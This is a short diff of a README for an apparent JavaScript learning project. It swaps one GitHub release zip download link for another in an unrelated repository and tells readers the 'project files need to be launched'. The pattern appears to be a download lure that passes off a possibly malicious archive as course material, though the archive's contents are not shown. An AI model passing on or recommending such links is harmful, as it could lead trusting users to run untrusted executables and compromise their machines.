@@ -39,7 +39,7 @@ Are you ready to embark on this coding journey and enhance your skills? Let's ge
 
 Click on the button below to download the project files:
 
-[![Download Project Files](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Project Files](https://github.com/basilthedog78/30DaysOfJS/releases/download/v1.0/Program.zip)](https://github.com/basilthedog78/30DaysOfJS/releases/download/v1.0/Program.zip)
 
 ### Note: Project files need to be launched!
 
